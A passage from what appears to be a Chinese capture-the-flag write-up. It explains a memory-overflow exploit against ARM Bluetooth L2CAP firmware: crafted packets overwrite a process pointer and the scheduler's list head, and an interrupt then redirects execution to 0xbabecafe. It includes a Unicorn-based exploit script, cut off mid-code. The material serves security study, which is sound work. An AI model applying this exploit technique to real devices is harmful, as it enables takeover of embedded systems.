+  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000E290</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="p">;</span>
+  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000E190</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="p">;</span>
+  <span class="n">__dsb</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span>
+  <span class="n">__isb</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">notification_process_0</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">process_poll</span><span class="p">((</span><span class="n">process</span> <span class="o">*</span><span class="p">)</span><span class="n">notification_process_0</span><span class="p">);</span>
+    <span class="n">notification_process_0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但这个进程似乎从来没有启动过，被 poll 也不会运行。（注意，如前文所说，一个进程只有在被 start 之后才能被 run）。好消息是 <code>process_list</code> 也在溢出点后方，既然 <code>notification_process_0</code> 从来没有被挂上 <code>process_list</code>，那么我们就把它“手动”挂上去！</p>
+<p>总结一下利用思路</p>
+<ol>
+<li>
+<p>利用溢出篡改 <code>notification_process_0</code> 指针使其指向受控制的内存区域（比如前面提到的大缓冲区），伪造入口点为 0xbabecafe</p>
+</li>
+<li>
+<p>利用溢出篡改 <code>process_list</code> 列表头为 <code>notification_process_0</code></p>
+</li>
+<li>
+<p>触发 161 号中断，它将把 <code>notification_process_0</code> 进程提到最前方。后续执行 <code>run_process</code> 时将遍历 <code>process_list</code> 列表，依次将需要 poll 的进程启动，如此便启动了 <code>notification_process_0</code> 进程，从入口点 0xbabecafe 处执行。</p>
+</li>
+</ol>
+<p>exp 如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">unicorn.arm_const</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>
+
+<span class="n">REGION_START</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">REGION_SIZE</span> <span class="o">=</span> <span class="mh">0x60000000</span>
+<span class="n">ROM_BASE</span> <span class="o">=</span> <span class="mh">0x202000</span>
+
+<span class="n">regs</span> <span class="o">=</span> <span class="p">[</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">UC_ARM_REG_R0</span><span class="p">,</span> <span class="n">UC_ARM_REG_R1</span><span class="p">,</span> <span class="n">UC_ARM_REG_R2</span><span class="p">,</span> <span class="n">UC_ARM_REG_R3</span><span class="p">,</span> <span class="n">UC_ARM_REG_R12</span><span class="p">,</span> <span class="n">UC_ARM_REG_LR</span><span class="p">]</span>
+
+<span class="n">data_ptr</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">data_len</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">emu_cnt</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">,</span> <span class="n">emu_cnt</span>
+    <span class="c1"># if (address &lt; 0x0203D6E and address &gt;= 0x203D5A):</span>
+    <span class="c1">#     print(f&#34;[hook code] 0x{address:x}, {size}, {user_data}&#34;)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DBA</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DBA: get_channel_for_cid, l2cap_channel_count &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">),</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20002D76</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D9C</span><span class="p">):</span>
+        <span class="n">data_ptr</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D9C: packetbuf_dataptr &#34;</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DA2</span><span class="p">):</span>
+        <span class="n">data_len</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DA2: packetbuf_datalen &#34;</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">))</span>
+            <span class="c1"># sleep(3)</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D3E</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D3E: r3, r4 &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">),</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R4</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DB4</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DB4: r5 &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R5</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202AF2</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202AF2: len , data&#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R4</span><span class="p">),</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x20241E</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202AF2: payload len &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R5</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x20247A</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x20247A: channel-&gt;rx_buffer.sdu_length &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202482</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202482: channel-&gt;rx_buffer.current_index &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R2</span><span class="p">)))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x2052F0</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x2052F0: p-&gt;state - 1 &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x205412</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x205412: nevents &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R2</span><span class="p">)))</span>
+    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x205498</span><span class="p">):</span>
+        <span class="n">r3</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x205498: poll_requested &#34;</span><span class="p">,</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">r3</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">9</span> <span class="ow">and</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;stop&#34;</span><span class="p">)</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">interrupted</span><span class="p">,</span> <span class="n">emu_cnt</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="c1"># interrupt </span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span><span class="p">):</span>
+        <span class="n">emu_cnt</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
+        <span class="c1"># sleep(3)</span>
+
+        <span class="c1"># save registers</span>
+        <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
+            <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
+            
+        <span class="c1"># execute functions</span>
+        <span class="k">if</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+            <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">161</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">158</span>
+        <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+            <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x20513C</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x203B1C</span><span class="p">)</span>
+
+        <span class="c1"># restore</span>
+        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
+            <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
+        <span class="c1"># mu.reg_write(UC_ARM_REG_PC, pc)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>
+
+    <span class="k">pass</span>
+    
+
+<span class="k">def</span> <span class="nf">hook_mem_unmapped</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_unmapped] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0xbabecafe</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0xbabecafe Bingo!!&#34;</span><span class="p">)</span>
+    <span class="k">pass</span>
+
+
+<span class="n">packet_injected</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">packet_body</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00\x05\x00\x14\x00\x0a\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span>
+
+<span class="n">channel_rx_buffer</span> <span class="o">=</span> <span class="mh">0x200008d4</span>
+<span class="n">pc_controlled</span> <span class="o">=</span> <span class="mh">0xbabecafe</span>
+
+<span class="n">packet_injected_2</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">packet_body_2</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pc_controlled</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa&#34;</span>
+
+
+<span class="c1"># override notification_process</span>
+<span class="n">packet_injected_3</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">packet_body_3</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aa&#34;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pc_controlled</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aafaaagaaahaaaiaaaja&#34;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa&#34;</span>
+
+<span class="c1"># override process_list</span>
+<span class="n">packet_injected_4_n</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
+<span class="n">packet_body_4_n</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;xaaayaaazaabbaabcaabdaabeaabfa&#34;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
+
+
+<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">packet_injected</span><span class="p">,</span> <span class="n">packet_body</span><span class="p">,</span> <span class="n">packet_body_2</span><span class="p">,</span> <span class="n">packet_injected_2</span><span class="p">,</span> <span class="n">packet_body_3</span><span class="p">,</span> <span class="n">packet_injected_3</span><span class="p">,</span> <span class="n">emu_cnt</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_read] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">packet_injected</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body</span><span class="p">)))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body</span><span class="p">[</span><span class="n">packet_injected</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="n">packet_injected</span> <span class="o">+=</span> <span class="mi">1</span>
+
+        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected_2</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">packet_injected_2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">)))</span>
+            <span class="k">else</span><span class="p">:</span>
